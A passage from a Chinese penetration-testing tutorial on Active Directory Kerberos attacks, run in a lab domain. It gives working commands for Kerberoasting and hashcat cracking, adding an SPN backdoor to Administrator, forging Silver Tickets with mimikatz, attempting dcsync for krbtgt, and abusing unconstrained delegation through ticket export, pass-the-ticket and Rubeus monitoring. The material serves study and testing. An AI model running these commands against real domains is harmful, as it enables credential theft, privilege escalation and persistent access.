import kerberos 改成 import kerberos_sspi as kerberos
但是这里的模块我没安装成功就没尝试这个操作
下载链接
    https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py
(2) 使用kirbi2john.py转格式
这里和(1)中使用的格式不同，因此可以使用hashcat john 工具来进行爆破票据  
在这里进行转换
    python kirbi2john.py *.kirbi > johnkirb.txt
在这里笔者pip包没有安装成功，因此没有截图。这两种失败没事，接下来的自动化导出直接替代了上面的所有！
### 0x03 全自动化导出
在这里使用 Empire 中的 Invoke-Kerberoast.ps1 脚本，导出hashcat格式的密钥。且它会自动选择所有的user Hash！
    powershell.exe -exec bypass -Command "& {Import-Module .\Invoke-Kerberoast.ps1;Invoke-kerberoast -outputformat hashcat |fl > hash.txt}"
### 0x04 暴力破解
将上述的数据中提取出hashcat可爆破的部分，放入hash.txt  
在这里使用hashcat进行破解
    hashcat -m 13100 hash.txt password.list -o found.txt --force
### 0x05 Kerberoasting后门利用
当我们获取到有权注册SPN的域账号时，或者拿到了域控。我们就可以为指定的域用户添加一个SPN。这样可以随时获得该用户的TGS，从而经过破解后可以获得明文口令。
如为添加管理员Administrator添加VNC/WIN-Q2JR4MURGS0.hacke.testlab
    setspn.exe -U -A VNC/WIN-Q2JR4MURGS0.hacke.testlab Administrator
## 白银票据
### 0x00 利用条件
攻击者在使用Silver Ticket对内网进行攻击时，需要掌握以下信息：
  * 域名
  * 域SID
  * 目标服务器的FQDN
  * 可利用的服务
  * 服务账号的NTLM Hash
  * 需要伪造的用户名
### 0x01 实验环境
**实验1：使用Silver Ticket伪造CIFS服务权限**
CIFS服务通常用于Windows主机之间的文件共享。
在本实验中，首先使用当前域用户权限，查询对域控制器的共享目录的访问权限。  
在域控制器中输入如下命令，使用mimikatz获取服务账号的NTLM Hash
使用log参数以便复制散列值
    mimikatz log "privilege::debug" "sekurlsa::logonpasswords"
机器账号的NTLM Hash
    f2abe578cdedfbb0dc5bf4249145c8dd
注意，这里使用的是共享服务账号，所以使用的是WIN-Q2JR4MURGS0$而非administrator
我们继续获取其他信息
域名(注入时需要写成小写)  
域SID
    whoami /all >123.txt  //注意要去掉-500
    WIN-Q2JR4MURGS0$
    domain:hacke.testlab
    SID:S-1-5-21-3502871099-3777307143-1257297015
然后，在命令行环境下输入如下命令，清空当前系统中的票据和域成员的票据，防止其他票据干扰。
    klist purge
    kerberos::purge
使用mimikatz生成伪造的 Silver Ticket ，在之前不能访问域控制器共享目录的机器输入如下命令:
    kerberos::golden /domain:域名 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:username /ptt
    kerberos::golden /domain:HACKE.TESTLAB /sid:S-1-5-21-3502871099-3777307143-1257297015 /target:WIN-Q2JR4MURGS0.hacke.testlab /service:cifs /rc4:f2abe578cdedfbb0dc5bf4249145c8dd /user:test /ptt
    或者
    mimikatz "kerberos::golden /domain:HACKE.TESTLAB /sid:S-1-5-21-3502871099-3777307143-1257297015 /target:WIN-Q2JR4MURGS0.hacke.testlab /service:cifs /rc4:f2abe578cdedfbb0dc5bf4249145c8dd /user:test /ptt"
**实验2 访问域控上的"LDAP"服务**
在本实验中，使用dcsync从域控制器中获取指定用户的账号和密码散列，如krbtgt
输入如下命令，测试以当前权限是否可以使用dcsync与域控制器进行同步
    lsadump::dcsync /dc:WIN-Q2JR4MURGS0.hacke.testlab /domain:hacke.testlab /user:krbtgt
向域控制器获取krbtgt的密码散列值失败，说明以当前权限不能进行dcsync操作。
这时候可以直接修改上面的命令，将服务修改成ldap即可！
    kerberos::golden /domain:HACKE.TESTLAB /sid:S-1-5-21-3502871099-3777307143-1257297015 /target:WIN-Q2JR4MURGS0.hacke.testlab /service:cifs /rc4:f2abe578cdedfbb0dc5bf4249145c8dd /user:test /ptt
再次访问即可！  
silver Ticket 还可以用于伪造其他服务，例如创建和修改计划任务、使用WMI对远程主机执行命令，使用powershell对远程主机进行管理等  
服务账号的NTLM Hash 这里用的是机器账号的NTLM Hash ，说是共享服务账号  
需要伪造的用户名，这里需要是域内的用户
参考链接：
    https://www.freebuf.com/articles/network/245872.html
    https://www.cnblogs.com/wuxinmengyi/p/11769233.html
    https://pureqh.top/?p=4358
    https://www.cnblogs.com/bmjoker/p/10355979.html
    https://www.anquanke.com/post/id/172900#h2-6
    https://www.cnblogs.com/bmjoker/p/10355979.html
# S4U
## 前言
域委派是指将域内用户的权限委派给服务账户，使得服务账号能够以用户的权限在域内展开活动。
委派主要分为非约束委派 (Unconstrained delegation)和约束委派 Constrained delegation)与基于资源的约束委派
（Resource Based Constrained Delegation）
## 非约束委派
### 原理
当user访问service1时，如果service1的服务账号开启了unconstrained
delegation(非约束委派)，则当user访问service1时会将user的TGT发送给service1并保存在内存中已备下次重用，然后service1就可以利用这张TGT以user的身份去访问域内的任何服务(任何服务是指user能够访问的服务)了
非约束委派的请求过程（图来自微软手册）：  
上图的kerberos请求描述分为如下步骤：
    1. 用户向`KDC`发送`KRB_AS_REQ`消息请求可转发的`TGT1`。
    2. KDC在`KRB_AS_REP`消息中返回`TGT1`。
    3. 用户根据步骤2中的TGT1请求转发TGT2。
    4. KDC在KRB_TGS_REP消息中为user返回TGT2。
    5. 用户使用步骤2中返回的TGT1向KDC请求Service1的ST（Service Ticket）
    6. TGS在KRB_TGS_REP消息中返回给用户service1的ST。
    7. 用户发送KRB_AP_REQ消息请求Service1，KRB_AP_REQ消息中包含了TGT1和Service1的ST、TGT2、TGT2的SessionKey
    8. service1使用用户发送过来的的TGT2，并以KRB_TGS_REQ的形式将其发送到KDC，以用户的名义请求service2的ST。
    9. KDC在KRB_TGS_REP消息中返回service2到service1的ST，以及service1可以使用的sessionkey。ST将客户端标识为用户，而不是service1。
    10. service1通过KRB_AP_REQ以用户的名义向service2发出请求。
    11. service2响应service1的请求。
    12. 有了这个响应，service1就可以在步骤7中响应用户的请求。
    13. 这里的TGT转发委派机制没有限制service1使用的TGT2是来自哪个服务，所以service1可以以用户的名义向KDC索要任何其他服务的票证。
    14. KDC返回步骤13中请求的ST
    15-16. service1以用户的名义来请求其它服务
注：TGT1(forwardable TGT) 用于访问Service1，TGT2(forwarded TGT)用于访问Service2
### 实验环境
操作环境
  * 域:hacke.testlab
  * 域控：win 2012 R2 主机名 WIN-Q2JR4MURGS0 IP 192.168.60.1
  * 域内主机：win7 主机名 WIN7 IP 192.168.60.50
### 非约束委派信息搜集
PowerSploit下的PowerView.ps1脚本
寻找设置了非约束委派的账号
    powershell.exe -exec bypass -Command "& {Import-Module .\PowerView.ps1;Get-NetUser -Unconstrained -Domain hacke.testlab | select name }"
寻找设置了非约束委派的主机
    powershell.exe -exec bypass -Command "& {Import-Module .\powerview.ps1;Get-NetComputer -Unconstrained -Domain hacke.testlab }"
pass:域控默认设置为非约束委派
使用ADFind.exe查找
寻找设置了非约束委派的账号
    AdFind.exe -b "DC=hacke,DC=testlab" -f "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
寻找设置了非约束委派的主机
    AdFind.exe -b "DC=hacke,DC=testlab" -f "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
pass:域控默认设置为非约束委派
### 非约束委派攻击
在这里首先将WIN7 机器设置为非约束委派权限  
每次实验之前清除票据  
#### 高权限机器主动访问我们
所需权限：  
非约束主机的管理权权限，需要导出内存中的票据
首先在域控上访问我们的WIN7，这里只要是高权限账户登录任意域内一台机器访问即可。  
这时候win7的lsass.exe内存中就会有域用户test的TGT票据。我们在win7上用管理员运行mimikatz，命令如下
    privilege::debug
    sekurlsa::tickets /export
设置非约束和约束的凭证区别  
在这里尝试访问域控判断是否成功  
使用mimikatz将这个票据导入内存中，然后访问域控  
导入票据
    kerberos::ptt [0;8c20d]PI:EMAIL
这时候就成功了  
这种方法除了欺骗他人之外，最常用的就是在IIS服务器上面的应用。因为很多web服务器开启了非委派，这样可以存储非常多的TGT。高权限导出即可!
#### 使用打印机服务BUG来访问我们
在第一种中，其实利用起来难度不小。让要高权限用户来访问我们的非约束主机其实利用起来不太好，所以这里我们还可以使用打印机的BUG，来让它以高权限用户访问非约束主机。
所需权限：  
非约束主机的管理权限，需要导出内存中的票据。  
有两种方式，1.system权限+其他方式获取的域sid 2.两个会话，一个system/administrator 一个域内权限
(1)system权限+其他方式获取的域sid
首先使用工具Rubeus.exe 1.5.0 监听来自WIN-Q2JR4MURGS0 Event
ID为4624事件。每隔一秒监听一次来自WIN-Q2JR4MURGS0的登录，然后将其写到文件夹里
    Rubeus.exe monitor /interval:1 /filteruser:WIN-Q2JR4MURGS0$ > C:\user.txt